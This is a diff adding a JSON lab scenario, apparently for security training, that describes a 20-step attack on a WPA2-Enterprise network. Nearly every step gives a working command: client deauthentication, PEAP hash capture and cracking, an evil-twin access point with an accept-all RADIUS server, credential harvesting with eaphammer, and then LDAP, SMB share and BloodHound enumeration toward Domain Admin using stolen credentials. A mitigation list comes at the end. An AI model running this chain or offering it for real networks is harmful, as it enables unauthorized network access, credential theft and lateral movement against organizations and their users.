@@ -1,0 +1,211 @@
+{
+  "title": "WPA-Enterprise Attack and RADIUS Exploitation",
+  "description": "Advanced attack chain targeting WPA2-Enterprise networks with PEAP credential capture and rogue RADIUS server",
+  "difficulty": "advanced",
+  "estimated_time": "90 minutes",
+  "tools_used": [
+    "airodump-ng",
+    "tshark",
+    "eaphammer",
+    "asleap",
+    "hashcat",
+    "freeradius"
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "title": "Enterprise Network Discovery",
+      "command": "airodump-ng --band abg wlan0mon",
+      "explanation": "Scan all bands for WPA2-Enterprise networks (identified by AUTH=MGT)",
+      "expected_output": "3 enterprise networks: CorpSecure (MGT, 2 clients), Enterprise-Net (MGT), UNIVERSITY-WiFi (MGT)",
+      "success_criteria": "WPA2-Enterprise networks identified"
+    },
+    {
+      "step": 2,
+      "title": "Targeted Enterprise Capture",
+      "command": "airodump-ng -c 6 --bssid B2:C3:D4:E5:F6:A7 -w corp_eap wlan0mon",
+      "explanation": "Focus on CorpSecure with active clients to capture EAP handshakes",
+      "expected_output": "Capturing channel 6, CorpSecure with 2 clients, EAPOL traffic detected",
+      "success_criteria": "EAP handshake capture active"
+    },
+    {
+      "step": 3,
+      "title": "Force EAP Handshake",
+      "command": "aireplay-ng --deauth 5 -a B2:C3:D4:E5:F6:A7 -c AB:CD:EF:12:34:56 wlan0mon",
+      "explanation": "Deauthenticate client to force re-authentication and capture full EAP exchange",
+      "expected_output": "Client disconnected, EAP handshake captured during reconnection (PEAP-MSCHAPv2)",
+      "success_criteria": "Complete EAPOL handshake in capture"
+    },
+    {
+      "step": 4,
+      "title": "Extract EAP Identities",
+      "command": "tshark -r corp_eap-01.cap -Y 'eap' -T fields -e eap.identity | sort -u",
+      "explanation": "Parse capture file to extract usernames from EAP Identity phase (cleartext)",
+      "expected_output": "6 usernames: john.doe, jane.smith, admin@corp.local, support, it_admin, user123",
+      "success_criteria": "Valid corporate usernames obtained"
+    },
+    {
+      "step": 5,
+      "title": "Identify EAP Methods",
+      "command": "tshark -r corp_eap-01.cap -Y 'eap.code == 2' -T fields -e eap.identity -e eap.type",
+      "explanation": "Determine EAP authentication methods in use (PEAP, EAP-TLS, EAP-TTLS)",
+      "expected_output": "5 users using PEAP (type 25), 1 using EAP-TLS (type 13 - admin@corp.local)",
+      "success_criteria": "EAP methods identified"
+    },
+    {
+      "step": 6,
+      "title": "PEAP Challenge/Response Extraction",
+      "command": "asleap -r corp_eap-01.cap -w /usr/share/wordlists/rockyou.txt",
+      "explanation": "Extract PEAP-MSCHAPv2 challenge/response pairs for offline cracking",
+      "expected_output": "2 MSCHAPv2 handshakes extracted for john.doe and jane.smith",
+      "success_criteria": "Crackable hashes extracted"
+    },
+    {
+      "step": 7,
+      "title": "Offline PEAP Password Cracking",
+      "command": "hashcat -m 5500 eap_hashes.txt /usr/share/wordlists/rockyou.txt",
+      "explanation": "Crack PEAP-MSCHAPv2 hashes using GPU acceleration (mode 5500)",
+      "expected_output": "Passwords cracked: john.doe/JohnPassword2024!, jane.smith/SmithPass123! (2min 15sec)",
+      "success_criteria": "Corporate credentials recovered"
+    },
+    {
+      "step": 8,
+      "title": "Rogue AP Setup - Phase 1",
+      "command": "cat > hostapd-eap.conf << EOF\nssid=CorpSecure\nwpa=2\nwpa_key_mgmt=WPA-EAP\nieee8021x=1\nauth_server_addr=127.0.0.1\nauth_server_port=1812\nEOF",
+      "explanation": "Configure fake WPA-Enterprise AP with RADIUS backend",
+      "expected_output": "hostapd configuration created for evil twin enterprise network",
+      "success_criteria": "Configuration ready"
+    },
+    {
+      "step": 9,
+      "title": "Fake RADIUS Server Configuration",
+      "command": "cat > /etc/freeradius/3.0/users << EOF\nDEFAULT Auth-Type := Accept\n    Reply-Message = \"Welcome to CorpSecure\"\nEOF",
+      "explanation": "Configure FreeRADIUS to accept any credentials and log them",
+      "expected_output": "RADIUS configured to accept all authentication attempts",
+      "success_criteria": "Permissive RADIUS ready"
+    },
+    {
+      "step": 10,
+      "title": "Start Fake RADIUS Server",
+      "command": "freeradius -X",
+      "explanation": "Launch FreeRADIUS in debug mode to see authentication attempts in real-time",
+      "expected_output": "RADIUS server listening on 127.0.0.1:1812, ready to accept EAP requests",
+      "success_criteria": "RADIUS operational"
+    },
+    {
+      "step": 11,
+      "title": "Launch Evil Twin Enterprise AP",
+      "command": "hostapd hostapd-eap.conf",
+      "explanation": "Start rogue WPA-Enterprise AP with fake RADIUS backend",
+      "expected_output": "Evil twin 'CorpSecure' broadcasting, identical to legitimate network",
+      "success_criteria": "Fake AP active"
+    },
+    {
+      "step": 12,
+      "title": "Automated Attack - EAPHammer",
+      "command": "eaphammer --interface wlan0 --bssid B2:C3:D4:E5:F6:A7 --essid CorpSecure --channel 6 --auth peap --creds",
+      "explanation": "Use EAPHammer for automated evil twin with credential harvesting",
+      "expected_output": "Rogue AP running, fake RADIUS accepting credentials, logging to /tmp/eaphammer_creds.txt",
+      "success_criteria": "Automated attack active"
+    },
+    {
+      "step": 13,
+      "title": "Deauthenticate Legitimate Clients",
+      "command": "aireplay-ng --deauth 0 -a B2:C3:D4:E5:F6:A7 wlan0mon",
+      "explanation": "Force clients to disconnect from real AP and connect to evil twin",
+      "expected_output": "Continuous deauth on real AP, clients connecting to evil twin",
+      "success_criteria": "Clients migrating to fake AP"
+    },
+    {
+      "step": 14,
+      "title": "Monitor Credential Capture",
+      "command": "tail -f /tmp/eaphammer_creds.txt",
+      "explanation": "Watch real-time credential harvesting as users authenticate to fake AP",
+      "expected_output": "5 credentials captured: john.doe/JohnPassword2024!, support/SupportPass!, it_admin/AdminIT2024!",
+      "success_criteria": "Multiple credentials harvested"
+    },
+    {
+      "step": 15,
+      "title": "Certificate Analysis",
+      "command": "tshark -r corp_eap-01.cap -Y 'tls.handshake.certificate' -T fields -e x509sat.uTF8String",
+      "explanation": "Extract server certificates from EAP-TLS to identify infrastructure",
+      "expected_output": "RADIUS server certificate: radius.corp.local, issued by Corp-CA, valid until 2025",
+      "success_criteria": "Infrastructure details revealed"
+    },
+    {
+      "step": 16,
+      "title": "Network Access with Stolen Credentials",
+      "command": "nmcli connection add type wifi con-name CorpReal ifname wlan0 ssid CorpSecure -- wifi-sec.key-mgmt wpa-eap 802-1x.eap peap 802-1x.identity john.doe 802-1x.password JohnPassword2024!",
+      "explanation": "Connect to real enterprise network using harvested credentials",
+      "expected_output": "Successfully authenticated as john.doe on legitimate CorpSecure network",
+      "success_criteria": "Legitimate network access"
+    },
+    {
+      "step": 17,
+      "title": "Internal Network Reconnaissance",
+      "command": "nmap -sV -p 22,80,443,445,389,636,3389 10.10.20.0/24",
+      "explanation": "Enumerate internal corporate network services and infrastructure",
+      "expected_output": "Domain Controller (LDAP 389/636), file servers (SMB 445), web apps (HTTP/HTTPS), 23 Windows hosts (RDP 3389)",
+      "success_criteria": "Corporate infrastructure mapped"
+    },
+    {
+      "step": 18,
+      "title": "LDAP Enumeration with User Credentials",
+      "command": "ldapsearch -x -h dc.corp.local -D 'john.doe@corp.local' -w JohnPassword2024! -b 'dc=corp,dc=local' '(objectClass=user)' sAMAccountName",
+      "explanation": "Use compromised credentials to enumerate Active Directory users",
+      "expected_output": "347 domain users enumerated from Active Directory",
+      "success_criteria": "Complete user list obtained"
+    },
+    {
+      "step": 19,
+      "title": "Lateral Movement Preparation",
+      "command": "crackmapexec smb 10.10.20.0/24 -u john.doe -p JohnPassword2024! --shares",
+      "explanation": "Test credentials across network for SMB access and identify accessible shares",
+      "expected_output": "john.doe has access to 12 file shares across 8 servers",
+      "success_criteria": "Lateral movement paths identified"
+    },
+    {
+      "step": 20,
+      "title": "Privilege Escalation Vector",
+      "command": "bloodhound-python -u john.doe -p JohnPassword2024! -d corp.local -c All -ns 10.10.20.1",
+      "explanation": "Run BloodHound to identify path to Domain Admin from compromised account",
+      "expected_output": "Attack path found: john.doe → IT Admins group → GenericAll on Domain Admins",
+      "success_criteria": "Escalation path to DA identified"
+    }
+  ],
+  "learning_objectives": [
+    "WPA2-Enterprise (802.1X) authentication mechanisms and EAP methods",
+    "EAP Identity extraction from cleartext authentication phase",
+    "PEAP-MSCHAPv2 challenge/response capture and offline cracking",
+    "Rogue RADIUS server deployment for credential harvesting",
+    "Evil twin attack against enterprise networks",
+    "Certificate analysis for infrastructure reconnaissance",
+    "Leveraging WiFi credentials for Active Directory access",
+    "Post-compromise enumeration in corporate environments",
+    "Lateral movement with domain credentials",
+    "Attack path analysis with BloodHound"
+  ],
+  "mitigation": [
+    "Use EAP-TLS with client certificates (no password-based auth)",
+    "Enforce strict certificate validation on clients",
+    "Implement certificate pinning for RADIUS servers",
+    "Deploy wireless intrusion detection systems (WIDS)",
+    "Monitor for rogue access points with matching SSIDs",
+    "Use 802.11w Management Frame Protection",
+    "Implement network access control (NAC) for device validation",
+    "Educate users on certificate warnings",
+    "Segment enterprise WiFi from critical resources",
+    "Require MFA for network authentication",
+    "Regular security awareness training on WiFi threats"
+  ],
+  "tags": [
+    "wpa_enterprise",
+    "802.1x",
+    "peap",
+    "eap",
+    "radius",
+    "evil_twin",
+    "credential_harvesting",
+    "active_directory"
+  ]
+}
